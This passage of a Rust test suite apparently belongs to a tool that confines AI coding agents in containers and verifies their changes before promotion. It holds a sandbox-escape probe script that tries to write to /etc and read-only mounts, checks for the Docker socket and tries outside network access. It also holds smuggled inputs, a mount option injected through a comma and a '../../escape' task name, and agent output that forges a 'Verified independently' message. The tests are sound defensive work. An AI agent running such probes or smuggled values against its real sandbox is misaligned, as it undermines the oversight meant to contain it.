        assert!(da.contains(&format!("--volume={}:/workspace:Z", t.0.display())) && !da.iter().any(|x| x.ends_with(",target=/workspace")), "{da:?}");
    }
}

fn inspected(spec: &container::BoxSpec, e: &container::Engine) -> Value {
    let mut env: Vec<String> = IMAGE_ENV.iter().map(|s| s.to_string()).collect();
    env.push("HOME=/home/kern".into());
    env.extend(spec.env.iter().map(|n| format!("{n}=value")));
    json!({ "Config": { "User": container::identity(e).0, "Env": env },
        "HostConfig": { "ReadonlyRootfs": true, "Privileged": false, "NetworkMode": "none", "PidMode": "", "IpcMode": "private", "Devices": [], "CapDrop": ["ALL"], "CapAdd": null,
            "SecurityOpt": ["no-new-privileges"], "Memory": spec.memory_mb * 1048576, "MemorySwap": spec.memory_mb * 1048576, "PidsLimit": spec.pids, "Runtime": "runc" },
        "Mounts": [{ "Type": "bind", "Destination": "/workspace", "RW": true }, { "Type": "bind", "Destination": "/opt/tool", "RW": false }] })
}
#[test]
fn container_inspection_refuses_a_box_the_engine_weakened() {
    let t = Temp::new();
    let command = vec!["/usr/local/bin/node".to_string()];
    let mounts = vec![container::Mount { source: t.join("tool"), target: "/opt/tool".into() }];
    let listed = vec!["AGENT_TOKEN".to_string()];
    let image_env: Vec<String> = IMAGE_ENV.iter().map(|s| s.to_string()).collect();
    let e = engine_of(&docker_info());
    let spec = box_spec(&t.0, &command, &mounts, &listed, false);
    container::confirm(&inspected(&spec, &e), &spec, &e, &image_env).unwrap();
    for (pointer, value, needle) in [
        ("/HostConfig/Memory", json!(0), "memory and process limits"), ("/HostConfig/PidsLimit", json!(0), "memory and process limits"),
        ("/HostConfig/MemorySwap", json!(-1), "memory and process limits"), ("/HostConfig/NetworkMode", json!("bridge"), "network"),
        ("/HostConfig/ReadonlyRootfs", json!(false), "read-only"), ("/HostConfig/Privileged", json!(true), "unprivileged"),
        ("/HostConfig/CapDrop", json!([]), "capabilit"), ("/HostConfig/CapAdd", json!(["NET_RAW"]), "capabilit"),
        ("/HostConfig/SecurityOpt", json!([]), "no-new-privileges"), ("/HostConfig/SecurityOpt", json!(["no-new-privileges", "seccomp=unconfined"]), "unconfined"),
        ("/HostConfig/SecurityOpt", json!(["no-new-privileges", "label=disable"]), "unconfined"), ("/HostConfig/PidMode", json!("host"), "namespace"),
        ("/HostConfig/IpcMode", json!("host"), "namespace"), ("/HostConfig/Devices", json!([{ "PathOnHost": "/dev/kvm" }]), "device"),
        ("/Config/User", json!("4242:4242"), "user"), ("/Mounts/1/RW", json!(true), "mount"),
    ] {
        let mut i = inspected(&spec, &e);
        *i.pointer_mut(pointer).unwrap() = value;
        denied(container::confirm(&i, &spec, &e, &image_env), needle);
    }
    let mut extra = inspected(&spec, &e);
    extra["Mounts"].as_array_mut().unwrap().push(json!({ "Type": "bind", "Destination": "/host", "RW": false }));
    denied(container::confirm(&extra, &spec, &e, &image_env), "mount");
    let mut leaked = inspected(&spec, &e);
    leaked["Config"]["Env"].as_array_mut().unwrap().extend([json!("HTTPS_PROXY=http://user:secret@proxy:3128"), json!("https_proxy=http://user:secret@proxy:3128")]);
    denied(container::confirm(&leaked, &spec, &e, &image_env), "HTTPS_PROXY, https_proxy");
    let open = box_spec(&t.0, &command, &mounts, &listed, true);
    let mut host = inspected(&open, &e);
    host["HostConfig"]["NetworkMode"] = json!("host");
    denied(container::confirm(&host, &open, &e, &image_env), "network");
    host["HostConfig"]["NetworkMode"] = json!("bridge");
    container::confirm(&host, &open, &e, &image_env).unwrap();
    let p = engine_of(&podman_info(&["memory", "pids"]));
    let mut listed_caps = inspected(&spec, &p);
    listed_caps["HostConfig"]["CapDrop"] = json!(["CAP_CHOWN", "CAP_KILL"]);
    listed_caps["HostConfig"]["PidMode"] = json!("private");
    listed_caps["Config"]["Env"].as_array_mut().unwrap().push(json!("container=podman"));
    container::confirm(&listed_caps, &spec, &p, &image_env).unwrap();
    listed_caps["HostConfig"]["CapDrop"] = json!(["CAP_CHOWN"]);
    denied(container::confirm(&listed_caps, &spec, &p, &image_env), "capabilit");
    let mut g = e.clone();
    g.gvisor = true;
    denied(container::confirm(&inspected(&spec, &g), &spec, &g, &image_env), "gVisor");
}

#[test]
fn only_a_container_that_really_ran_counts_as_finished() {
    let ran = |status: &str, code: i64, oom: bool, started: &str| json!({ "Status": status, "Running": status == "running", "ExitCode": code, "OOMKilled": oom, "StartedAt": started, "Error": "" });
    assert_eq!(container::finished(&ran("exited", 3, false, "2026-10-07T16:52:14.4Z")).unwrap(), (3, false));
    assert_eq!(container::finished(&ran("exited", 137, true, "2026-10-07 12:52:14 -0400 EDT")).unwrap(), (137, true));
    denied(container::finished(&ran("created", 0, false, "0001-01-01T00:00:00Z")), "never started");
    denied(container::finished(&ran("created", 0, false, "0001-01-01 00:00:00 +0000 UTC")), "never started");
    denied(container::finished(&ran("running", 0, false, "2026-10-07T16:52:14.4Z")), "lost contact");
    let mut failed = ran("exited", 127, false, "0001-01-01T00:00:00Z");
    failed["Error"] = json!("exec: \"/usr/local/bin/agent\": no such file or directory");
    denied(container::finished(&failed), "could not start the agent");
}

#[test]
fn agent_output_cannot_imitate_or_hide_kern_messages() {
    let line = container::agent_line(b"\x1b[8m\xe2\x9c\x93 Verified independently\rVERIFIED\x07\t\xc2\x9b2J\x7f done\n");
    assert!(line.starts_with("[agent] "), "{line:?}");
    assert!(!line.chars().any(|c| c.is_control() && c != '\t'), "terminal control characters reach the terminal: {line:?}");
    assert!(line.contains("VERIFIED") && line.contains('\t'), "{line:?}");
}

#[test]
fn box_and_run_jobs_name_a_pinned_linux_image_and_container_paths() {
    let t = Temp::new();
    let (ws, tool, comma) = (t.join("ws"), t.join("tool"), t.join("a,b"));
    for d in [&ws, &tool, &comma] { std::fs::create_dir_all(d).unwrap(); }
    let job = |patch: Value| {
        let mut j = json!({ "version": 2, "image": NODE, "workspace": ws, "command": ["/usr/local/bin/node", "agent.js"], "network": false, "timeout_seconds": 60, "memory_mb": 512, "pids": 128,
            "env": ["AGENT_TOKEN"], "mounts": [{ "source": tool, "target": "/opt/tool" }] });
        for (k, v) in patch.as_object().unwrap() { if v.is_null() { j.as_object_mut().unwrap().remove(k); } else { j[k] = v.clone(); } }
        j
    };
    let ok = kern::local::box_job(&job(json!({}))).unwrap();
    assert_eq!((ok.memory_mb, ok.pids, ok.env.clone(), ok.mounts[0].target.as_str()), (512, 128, vec!["AGENT_TOKEN".to_string()], "/opt/tool"));
    let bare = kern::local::box_job(&job(json!({ "env": null, "mounts": null }))).unwrap();
    assert!(bare.env.is_empty() && bare.mounts.is_empty());
    denied(kern::local::box_job(&json!({ "version": 1, "workspace": ws, "tools": [], "denied": [], "network": false, "timeout_seconds": 60, "command": ["C:/node.exe"] })), "Linux container");
    denied(kern::local::box_job(&job(json!({ "image": "node:22" }))), "pinned by digest");
    denied(kern::local::box_job(&job(json!({ "command": ["node", "agent.js"] }))), "absolute container path");
    for names in [json!(["HOME"]), json!(["BAD-NAME"]), json!([""]), json!(["1X"]), json!(["A", "A"])] { denied(kern::local::box_job(&job(json!({ "env": names }))), "env"); }
    for target in ["/workspace", "/workspace/x", "/tmp", "/home/kern/.cache", "relative", "/opt/../etc", "/", "/proc/x", "/opt/x,readonly=false"] {
        denied(kern::local::box_job(&job(json!({ "mounts": [{ "source": tool, "target": target }] }))), "mount target");
    }
    denied(kern::local::box_job(&job(json!({ "mounts": [{ "source": tool, "target": "/opt/a" }, { "source": tool, "target": "/opt/a" }] }))), "mount target");
    denied(kern::local::box_job(&job(json!({ "mounts": [{ "source": t.join("missing"), "target": "/opt/x" }] }))), "mount source");
    denied(kern::local::box_job(&job(json!({ "mounts": [{ "source": comma, "target": "/opt/x" }] }))), "comma");
    denied(kern::local::box_job(&job(json!({ "mounts": [{ "source": ws, "target": "/opt/x" }] }))), "overlaps");
    denied(kern::local::box_job(&job(json!({ "mounts": [{ "source": t.0, "target": "/opt/x" }] }))), "overlaps");
    denied(kern::local::box_job(&job(json!({ "memory_mb": 9000 }))), "memory_mb");
    std::fs::create_dir_all(t.join("repo")).unwrap();
    std::fs::write(t.join("task.json"), policy_value().to_string()).unwrap();
    let run = |patch: Value| {
        let mut j = json!({ "version": 2, "repo": "./repo", "base": "a".repeat(40), "contract": "./task.json", "image": NODE, "command": ["/usr/local/bin/node", "agent.js"], "network": true,
            "env": ["AGENT_TOKEN"], "mounts": [{ "source": tool, "target": "/opt/tool" }], "output": "./runs", "promote": false });
        for (k, v) in patch.as_object().unwrap() { j[k] = v.clone(); }
        std::fs::write(t.join("run.json"), j.to_string()).unwrap();
        kern::local::run_job(&t.join("run.json"))
    };
    let r = run(json!({})).unwrap();
    assert!(r.network && r.image == NODE && r.command[0] == "/usr/local/bin/node" && r.mounts.len() == 1 && r.env == ["AGENT_TOKEN"]);
    denied(run(json!({ "version": 1, "tools": [] })), "Linux container");
    denied(run(json!({ "mounts": [{ "source": t.join("repo"), "target": "/opt/repo" }] })), "overlaps");
    denied(run(json!({ "output": "./a,b/runs" })), "comma");
    std::fs::create_dir_all(t.join("sub")).unwrap();
    std::fs::create_dir_all(t.join("runs")).unwrap();
    denied(run(json!({ "output": "./sub/../runs", "mounts": [{ "source": t.join("runs"), "target": "/opt/runs" }] })), "overlaps");
}

#[test]
fn without_a_container_runtime_kern_says_what_to_install() {
    let t = Temp::new();
    let missing = t.join("no-such-runtime");
    let repo = t.join("repo");
    sh(&t.0, &["init", "-q", "repo"]);
    std::fs::write(repo.join("README.md"), "x\n").unwrap();
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    std::fs::write(t.join("task.json"), policy_value().to_string()).unwrap();
    std::fs::write(t.join("run.json"), json!({ "version": 2, "repo": "./repo", "base": sh(&repo, &["rev-parse", "HEAD"]), "contract": "./task.json", "image": NODE,
        "command": ["/usr/local/bin/node", "-e", "0"], "network": false, "output": "./runs", "promote": false }).to_string()).unwrap();
    std::fs::write(t.join("box.json"), json!({ "version": 2, "image": NODE, "workspace": repo, "command": ["/usr/local/bin/node", "-e", "0"], "network": false, "timeout_seconds": 10, "memory_mb": 64, "pids": 16 }).to_string()).unwrap();
    let kern = |args: &[&std::ffi::OsStr]| Command::new(env!("CARGO_BIN_EXE_kern")).args(args).env("KERN_CONTAINER_CLI", &missing).output().unwrap();
    let explains = |text: &str| text.contains("no container runtime is ready") && text.contains("Docker Desktop") && text.contains("WSL2");
    let boxed = kern(&["box".as_ref(), t.join("box.json").as_os_str()]);
    assert!(boxed.status.code() == Some(1) && explains(&String::from_utf8_lossy(&boxed.stderr)), "{boxed:?}");
    let doctor = kern(&["doctor".as_ref()]);
    assert!(doctor.status.code() == Some(2) && explains(&String::from_utf8_lossy(&doctor.stdout)), "{doctor:?}");
    let run = kern(&["run".as_ref(), t.join("run.json").as_os_str()]);
    let out = String::from_utf8_lossy(&run.stdout);
    assert!(run.status.code() == Some(1) && out.contains("BLOCKED: Kern runs agents in a Linux container") && explains(&out), "{run:?}");
    assert!(std::fs::read_to_string(t.join("runs/audit.jsonl")).unwrap().contains("BLOCKED"), "the blocked run is still audited");
}

fn container_ready() -> bool {
    match container::engine() {
        Ok(_) => true,
        Err(e) => {
            assert!(std::env::var("KERN_REQUIRE_CONTAINER").as_deref() != Ok("1"), "KERN_REQUIRE_CONTAINER=1, but {e}");
            eprintln!("skipping a container test: {e}");
            false
        }
    }
}
fn containers_using(ws: &Path) -> usize {
    let e = container::engine().unwrap();
    let ids = Command::new(&e.cli).args(["ps", "--all", "--quiet", "--filter", "label=kern.box"]).output().unwrap().stdout;
    String::from_utf8_lossy(&ids).split_whitespace().filter(|id| {
        let out = Command::new(&e.cli).args(["inspect", "--type", "container", id]).output().unwrap().stdout;
        serde_json::from_slice::<Value>(&out).ok().is_some_and(|v| v[0]["Mounts"].as_array().is_some_and(|m| m.iter().any(|m| m["Source"].as_str().is_some_and(|s| Path::new(s) == ws))))
    }).count()
}
const PROBE: &str = r#"
const fs = require('fs'), net = require('net'), os = require('os');
const r = {};
const attempt = (key, f) => { try { f(); r[key] = 'ok'; } catch (e) { r[key] = e.code || String(e); } };
attempt('workspace', () => fs.writeFileSync('/workspace/inside.txt', 'x'));
attempt('rootfs', () => fs.writeFileSync('/etc/kern-escape', 'x'));
attempt('mount', () => fs.writeFileSync('/opt/tool/escape', 'x'));
attempt('home', () => fs.writeFileSync(os.homedir() + '/state', 'x'));
attempt('docker_socket', () => fs.statSync('/var/run/docker.sock'));
r.passed = process.env.KERN_TEST_PASSED ?? null;
r.hidden = process.env.KERN_TEST_HIDDEN ?? null;
r.env = Object.keys(process.env).sort();
const number = (...files) => { for (const f of files) { try { const v = fs.readFileSync(f, 'utf8').trim(); if (/^\d+$/.test(v)) return Number(v); } catch {} } return null; };
r.memory = number('/sys/fs/cgroup/memory.max', '/sys/fs/cgroup/memory/memory.limit_in_bytes');
r.pids = number('/sys/fs/cgroup/pids.max', '/sys/fs/cgroup/pids/pids.max');
const finish = (v) => { r.network = v; fs.writeFileSync('/workspace/report.json', JSON.stringify(r)); process.exit(3); };
const s = net.connect({ host: '1.1.1.1', port: 443, timeout: 3000 });
s.on('connect', () => finish('reached'));
s.on('error', (e) => finish('blocked ' + e.code));
s.on('timeout', () => finish('blocked timeout'));
"#;

#[test]
fn container_box_confines_the_agent_to_its_workspace() {
    if !container_ready() { return; }
    let t = Temp::new();
    let (ws, tool) = (t.join("ws"), t.join("tool"));
    std::fs::create_dir_all(&ws).unwrap();
    std::fs::create_dir_all(&tool).unwrap();
    std::fs::write(tool.join("probe.js"), PROBE).unwrap();
    std::fs::write(t.join("box.json"), json!({ "version": 2, "image": NODE, "workspace": ws, "command": ["/usr/local/bin/node", "/opt/tool/probe.js"], "network": false,
        "timeout_seconds": 120, "memory_mb": 256, "pids": 64, "env": ["KERN_TEST_PASSED"], "mounts": [{ "source": tool, "target": "/opt/tool" }] }).to_string()).unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_kern")).arg("box").arg(t.join("box.json")).env("KERN_TEST_PASSED", "visible").env("KERN_TEST_HIDDEN", "secret").output().unwrap();
    let r: Value = serde_json::from_slice(&out.stdout).unwrap_or_else(|_| panic!("{}", String::from_utf8_lossy(&out.stderr)));
    assert_eq!((out.status.code(), r["status"].as_str(), r["exit_code"].as_i64()), (Some(3), Some("EXITED"), Some(3)), "the agent's exit code comes back: {r}");
    let report: Value = serde_json::from_slice(&std::fs::read(ws.join("report.json")).unwrap()).unwrap();
    assert_eq!([&report["workspace"], &report["rootfs"], &report["mount"], &report["home"], &report["docker_socket"]], [&json!("ok"), &json!("EROFS"), &json!("EROFS"), &json!("ok"), &json!("ENOENT")], "{report}");
    assert_eq!((&report["passed"], &report["hidden"]), (&json!("visible"), &Value::Null), "only listed variables reach the agent: {report}");
    for host_only in ["USERPROFILE", "SystemRoot", "USER", "SHELL", "SSH_AUTH_SOCK", "KERN_TEST_HIDDEN"] {
        assert!(!report["env"].as_array().unwrap().iter().any(|k| k == host_only), "{host_only} reached the agent: {report}");
    }
    assert!(report["network"].as_str().unwrap().starts_with("blocked"), "{report}");
    if !report["memory"].is_null() { assert_eq!(report["memory"], 256 * 1048576, "{report}"); }
    if !report["pids"].is_null() { assert_eq!(report["pids"], 64, "{report}"); }
    assert_eq!(containers_using(&ws), 0, "the container is gone before Kern returns");
}

#[test]
fn container_run_boxes_the_agent_gates_its_output_and_promotes_create_only() {
    if !container_ready() { return; }
    let t = Temp::new();
    let repo = t.join("repo");
    sh(&t.0, &["init", "-q", "repo"]);
    sh(&repo, &["config", "core.autocrlf", "false"]);
    std::fs::create_dir_all(repo.join("src")).unwrap();
    std::fs::write(repo.join("src/add.mjs"), "export const add = (a, b) => a - b;\n").unwrap();
    std::fs::write(repo.join("README.md"), "# fixture\n").unwrap();
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let base = sh(&repo, &["rev-parse", "HEAD"]);
    std::fs::write(t.join("task.json"), policy_value().to_string()).unwrap();
    let run = |name: &str, script: &str| {
        std::fs::write(t.join(name), json!({ "version": 2, "repo": "./repo", "base": base, "contract": "./task.json", "image": NODE,
            "command": ["/usr/local/bin/node", "-e", script], "network": false, "output": "./runs", "promote": true }).to_string()).unwrap();
        kern::local::local_run(&kern::local::run_job(&t.join(name)).unwrap()).unwrap()
    };
    let r = run("green.json", "require('fs').writeFileSync('src/add.mjs', 'export const add = (a, b) => a + b;\\n')");
    assert_eq!(r["status"], "GREEN", "{r}");
    let branch = r["promotion"]["branch"].as_str().unwrap().to_string();
    assert_eq!(sh(&repo, &["rev-parse", "HEAD"]), base, "the real HEAD must not move");
    assert_eq!(std::fs::read_to_string(repo.join("src/add.mjs")).unwrap(), "export const add = (a, b) => a - b;\n", "the real working tree must be untouched");
    assert_eq!(sh(&repo, &["show", &format!("{branch}:src/add.mjs")]), "export const add = (a, b) => a + b;", "the promoted branch carries the agent's change");
    assert!(r["box"]["engine"].is_string() && r["box"]["image"] == NODE, "{r}");
    let outside = run("outside.json", "require('fs').writeFileSync('README.md', 'x\\n')");
    assert!(outside["status"] == "BLOCKED" && outside["promotion"].is_null(), "an out-of-contract change is not promoted: {outside}");
    let big = run("big.json", "require('fs').writeFileSync('src/big.txt', 'x'.repeat(100000))");
    assert!(big["status"] == "BLOCKED" && big["summary"].as_str().unwrap().contains("byte limits"), "unreadable output is a verdict, not an error: {big}");
    let hungry = run("hungry.json", "const a = []; for (;;) a.push(Buffer.alloc(1 << 20, 1));");
    assert!(hungry["status"] == "BLOCKED" && hungry["summary"].as_str().unwrap().contains("ran out of memory"), "{hungry}");
    let branches = sh(&repo, &["for-each-ref", "--format=%(refname:short)", "refs/heads/kern/"]);
    assert_eq!(branches.lines().count(), 1, "only the green run may create a branch: {branches}");
}

#[test]
fn container_box_stops_an_agent_that_outlives_its_deadline() {
    if !container_ready() { return; }
    let t = Temp::new();
    let ws = t.join("ws");
    std::fs::create_dir_all(&ws).unwrap();
    let job = json!({ "version": 2, "image": NODE, "workspace": ws, "command": ["/usr/local/bin/node", "-e", "setInterval(() => {}, 1000)"], "network": false, "timeout_seconds": 3, "memory_mb": 128, "pids": 32 });
    let started = std::time::Instant::now();
    let r = kern::local::run_box_job(&kern::local::box_job(&job).unwrap());
    assert!(started.elapsed() < std::time::Duration::from_secs(60), "the box gave up after {:?}", started.elapsed());
    denied(r, "did not finish within 3 seconds");
    assert_eq!(containers_using(&ws), 0, "a stopped agent's container is removed");
}

fn slow_box(t: &Temp, name: &str, configure: impl FnOnce(&mut Command)) -> (std::process::Child, PathBuf) {
    let ws = t.join(name);
    std::fs::create_dir_all(&ws).unwrap();
    let job = t.join(&format!("{name}.json"));
    std::fs::write(&job, json!({ "version": 2, "image": NODE, "workspace": ws, "network": false, "timeout_seconds": 600, "memory_mb": 256, "pids": 64,
        "command": ["/usr/local/bin/node", "-e", "require('fs').writeFileSync('started', ''); setInterval(() => {}, 1000)"] }).to_string()).unwrap();
    let mut cmd = Command::new(env!("CARGO_BIN_EXE_kern"));
    cmd.arg("box").arg(&job).stdout(std::process::Stdio::piped()).stderr(std::process::Stdio::piped());
    configure(&mut cmd);
    let child = cmd.spawn().unwrap();
    let started = std::time::Instant::now();
    while !ws.join("started").exists() {
        assert!(started.elapsed() < std::time::Duration::from_secs(120), "the agent never started");
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
    (child, ws)
}
fn stopped_cleanly(child: std::process::Child, ws: &Path, how: &str) {
    let sent = std::time::Instant::now();
    let out = child.wait_with_output().unwrap();
    assert!(sent.elapsed() < std::time::Duration::from_secs(60), "{how}: Kern took {:?} to stop", sent.elapsed());
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(out.status.code() == Some(1) && err.contains("Interrupted"), "{how}: {out:?}");
    assert_eq!(containers_using(ws), 0, "{how} left a container behind");
}

#[cfg(unix)]
#[test]
fn interrupting_or_hanging_up_stops_the_agent_and_removes_its_container() {
    if !container_ready() { return; }
    let t = Temp::new();
    for (i, (signal, how)) in [(libc::SIGINT, "Ctrl+C"), (libc::SIGTERM, "SIGTERM"), (libc::SIGHUP, "a closed terminal")].into_iter().enumerate() {
        let (child, ws) = slow_box(&t, &format!("ws{i}"), |_| {});
        unsafe { libc::kill(child.id() as libc::pid_t, signal); }
        stopped_cleanly(child, &ws, how);
    }
}

#[cfg(windows)]
#[test]
fn ctrl_break_stops_the_agent_and_removes_its_container() {
    if !container_ready() { return; }
    #[link(name = "kernel32")]
    unsafe extern "system" { fn GenerateConsoleCtrlEvent(event: u32, group: u32) -> i32; }
    let t = Temp::new();
    let (mut child, ws) = slow_box(&t, "ws", |c| { std::os::windows::process::CommandExt::creation_flags(c, 0x0000_0200); });
    if unsafe { GenerateConsoleCtrlEvent(1, child.id()) } == 0 {
        eprintln!("skipping: this test process has no console to send Ctrl+Break through");
        let _ = child.kill();
        let _ = child.wait();
        return;
    }
    stopped_cleanly(child, &ws, "Ctrl+Break");
}

#[test]
fn a_killed_kern_leaves_no_agent_behind() {
    if !container_ready() { return; }
    let t = Temp::new();
    let (mut child, ws) = slow_box(&t, "ws", |_| {});
    child.kill().unwrap();
    let _ = child.wait();
    let killed = std::time::Instant::now();
    while containers_using(&ws) > 0 {
        assert!(killed.elapsed() < std::time::Duration::from_secs(60), "the agent outlived the Kern process that started it");
        std::thread::sleep(std::time::Duration::from_millis(500));
    }
}

#[test]
fn variables_an_engine_adds_on_its_own_are_refused() {
    if !container_ready() || container::engine().unwrap().podman { return; }
    let t = Temp::new();
    let config = t.join("docker-config");
    std::fs::create_dir_all(&config).unwrap();
    std::fs::write(config.join("config.json"), json!({ "proxies": { "default": { "httpsProxy": "http://user:secret@proxy.example:3128" } } }).to_string()).unwrap();
    let ws = t.join("ws");
    std::fs::create_dir_all(&ws).unwrap();
    std::fs::write(t.join("box.json"), json!({ "version": 2, "image": NODE, "workspace": ws, "command": ["/usr/local/bin/node", "-e", "require('fs').writeFileSync('ran', '')"],
        "network": false, "timeout_seconds": 60, "memory_mb": 256, "pids": 64 }).to_string()).unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_kern")).arg("box").arg(t.join("box.json")).env("DOCKER_CONFIG", &config).env_remove("DOCKER_CONTEXT").output().unwrap();
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(out.status.code() == Some(1) && err.contains("HTTPS_PROXY") && !err.contains("secret"), "Docker's proxy settings must not reach the agent: {out:?}");
    assert!(!ws.join("ran").exists(), "the agent must not start");
    assert_eq!(containers_using(&ws), 0);
}

#[test]
fn factory_lock_gate_allows_a_proven_commit_and_refuses_everything_else() {
    let f = fixture();
    let cfg = f.t.join("config");
    std::fs::create_dir_all(cfg.join("tasks")).unwrap();
    std::fs::write(cfg.join("operator.json"), operator_value(&["external"]).to_string()).unwrap();
    std::fs::write(cfg.join("verifier.pub"), &f.public).unwrap();
    std::fs::write(cfg.join("tasks/fix-addition.json"), policy_value().to_string()).unwrap();

    let ok = promote::gate_artifact(&f.store, &f.commit, &f.envelope, &cfg, now_ms()).unwrap();
    assert_eq!(ok["status"], "ALLOW");
    assert_eq!(ok["commit"], f.commit);

    denied(promote::gate_artifact(&f.store, &f.base, &f.envelope, &cfg, now_ms()), "");
    let mut tampered = f.envelope.clone();
    tampered["payload"] = json!(b64(b"{}"));
    assert!(promote::gate_artifact(&f.store, &f.commit, &tampered, &cfg, now_ms()).is_err());
    let other = attest::public_pem(&SigningKey::from_bytes(&random_bytes::<32>().unwrap()).verifying_key()).unwrap();
    std::fs::write(cfg.join("verifier.pub"), &other).unwrap();
    denied(promote::gate_artifact(&f.store, &f.commit, &f.envelope, &cfg, now_ms()), "Untrusted");
}

#[test]
fn a_separately_built_checker_accepts_the_verifiers_proof() {
    let f = fixture();
    let cfg = f.t.join("config");
    std::fs::create_dir_all(cfg.join("tasks")).unwrap();
    std::fs::write(cfg.join("operator.json"), operator_value(&["external"]).to_string()).unwrap();
    std::fs::write(cfg.join("verifier.pub"), &f.public).unwrap();
    std::fs::write(cfg.join("tasks/fix-addition.json"), policy_value().to_string()).unwrap();
    std::fs::write(f.t.join("attestation.json"), f.envelope.to_string()).unwrap();
    assert_ne!(sha256(std::fs::read(env!("CARGO_BIN_EXE_kern")).unwrap()), policy::implementation_digest().unwrap());
    let out = Command::new(env!("CARGO_BIN_EXE_kern")).arg("gate-artifact").arg(&f.store).arg(&f.commit).arg(f.t.join("attestation.json")).arg(&cfg).output().unwrap();
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    assert_eq!(serde_json::from_slice::<Value>(&out.stdout).unwrap()["status"], "ALLOW");
}

#[test]
fn factory_lock_refuses_an_unverified_task_name_before_reading_config() {
    let f = fixture();
    let cfg = f.t.join("config");
    std::fs::create_dir_all(cfg.join("tasks")).unwrap();
    std::fs::write(cfg.join("operator.json"), operator_value(&["external"]).to_string()).unwrap();
    std::fs::write(cfg.join("verifier.pub"), &f.public).unwrap();
    std::fs::write(f.t.join("escape.json"), "{").unwrap();
    let mut k = f.kern.clone();
    k["task"] = json!("../../escape");
    let envelope = attest::sign(&k, &KeySource::File(f.key.clone())).unwrap();
    denied(promote::gate_artifact(&f.store, &f.commit, &envelope, &cfg, now_ms()), "Invalid task");
}

#[test]
fn dev_side_confirm_accepts_only_the_trusted_signed_proof_for_the_exact_commit() {
    let f = fixture();
    kern::local::confirm_attestation(&f.envelope, &f.public, &f.commit).unwrap();
    let other = attest::public_pem(&SigningKey::from_bytes(&random_bytes::<32>().unwrap()).verifying_key()).unwrap();
    denied(kern::local::confirm_attestation(&f.envelope, &other, &f.commit), "trusted verifier key");
    let mut tampered = f.envelope.clone();
    tampered["payload"] = json!(b64(b"{}"));
    assert!(kern::local::confirm_attestation(&tampered, &f.public, &f.commit).is_err());
    denied(kern::local::confirm_attestation(&f.envelope, &f.public, &f.base), "exact approved commit");
}

#[test]
fn file_level_write_grants_enable_root_source_repos() {
    let c = json!({ "version": 2, "task": "root-src", "filesystem": { "read": ["index.js", "lib/"], "write": ["index.js", "lib/"] },
        "network": [], "secrets": [], "publish": false, "dependencies": null,
        "limits": { "files_changed": 8, "lines_changed": 200, "file_bytes": 65536, "total_bytes": 1048576, "timeout_seconds": 30, "memory_mb": 256, "pids": 64 }, "required_checks": ["build"] });
    let policy = contract(&c).unwrap();
    assert_eq!(policy.write, vec!["index.js".to_string(), "lib/".to_string()]);
    let base = files(&[("index.js", "module.exports = require('./lib/a');\n"), ("lib/a.js", "module.exports = 1;\n"), ("README.md", "hi\n")]);
    let mut good = base.clone();
    good.insert("index.js".into(), file("module.exports = require('./lib/a');\n// kern edit\n"));
    git::changes(&base, &good, &policy).unwrap();
    let mut good2 = base.clone();
    good2.insert("lib/a.js".into(), file("module.exports = 2;\n"));
    git::changes(&base, &good2, &policy).unwrap();
    let mut bad = base.clone();
    bad.insert("README.md".into(), file("hacked\n"));
    denied(git::changes(&base, &bad, &policy), "outside contract");
    let mut overlap = c.clone();
    overlap["filesystem"]["read"] = json!(["lib/", "lib/a.js"]);
    overlap["filesystem"]["write"] = json!(["lib/", "lib/a.js"]);
    denied(contract(&overlap), "Overlapping");
}

#[test]
fn large_assets_stream_without_loading_and_changed_assets_fail_closed() {
    let t = Temp::new();
    let repo = t.join("repo");
    std::fs::create_dir_all(repo.join("src")).unwrap();
    sh(&t.0, &["init", "-q", "repo"]);
    sh(&repo, &["config", "core.autocrlf", "false"]);
    std::fs::write(repo.join("logo.bin"), vec![7u8; 2 * 1048576]).unwrap();
    std::fs::write(repo.join("src/a.js"), "module.exports = 1;\n").unwrap();
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let base = sh(&repo, &["rev-parse", "HEAD"]);

    let files = git::read_commit(&repo, &base, 65536, 1048576).unwrap();
    assert_eq!(files.len(), 2);
    assert!(files["logo.bin"].bytes.is_none() && files["logo.bin"].size == 2 * 1048576);
    assert!(files["src/a.js"].bytes.is_some());
    assert_eq!(digest(&git::manifest(&repo, &base, 65536, 1048576).unwrap()).unwrap(), digest(&git::manifest(&repo, &base, 65536, 1048576).unwrap()).unwrap());
    let rewritten = git::write_commit(&repo, &files, None, "t").unwrap();
    assert_eq!(sh(&repo, &["rev-parse", &format!("{rewritten}^{{tree}}")]), sh(&repo, &["rev-parse", "HEAD^{tree}"]));

    let policy = contract(&json!({ "version": 2, "task": "asset", "filesystem": { "read": ["src/", "logo.bin"], "write": ["src/", "logo.bin"] },
        "network": [], "secrets": [], "publish": false, "dependencies": null,
        "limits": { "files_changed": 8, "lines_changed": 200, "file_bytes": 65536, "total_bytes": 1048576, "timeout_seconds": 30, "memory_mb": 256, "pids": 64 }, "required_checks": ["build"] })).unwrap();
    let mut good = files.clone();
    good.insert("src/a.js".into(), file("module.exports = 2;\n"));
    let changed = git::changes(&files, &good, &policy).unwrap();
    assert_eq!(changed["files"].as_array().unwrap().len(), 1);
    let mut bad = files.clone();
    bad.insert("logo.bin".into(), git::Entry { mode: "100644".into(), oid: "a".repeat(40), size: 2 * 1048576, bytes: None });
    denied(git::changes(&files, &bad, &policy), "Binary or oversized change unsupported");
}

#[test]
fn workspace_read_back_preserves_modes_and_tracked_node_modules() {
    let t = Temp::new();
    let repo = t.join("repo");
    sh(&t.0, &["init", "-q", "repo"]);
    sh(&repo, &["config", "core.autocrlf", "false"]);
    for (p, c) in [("bin/cli.js", "#!/usr/bin/env node\n"), ("src/tool.js", "module.exports = 1;\n"), ("test/fixtures/node_modules/dep/index.js", "module.exports = 2;\n")] {
        std::fs::create_dir_all(repo.join(p).parent().unwrap()).unwrap();
        std::fs::write(repo.join(p), c).unwrap();
    }
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["update-index", "--chmod=+x", "bin/cli.js", "src/tool.js"]);
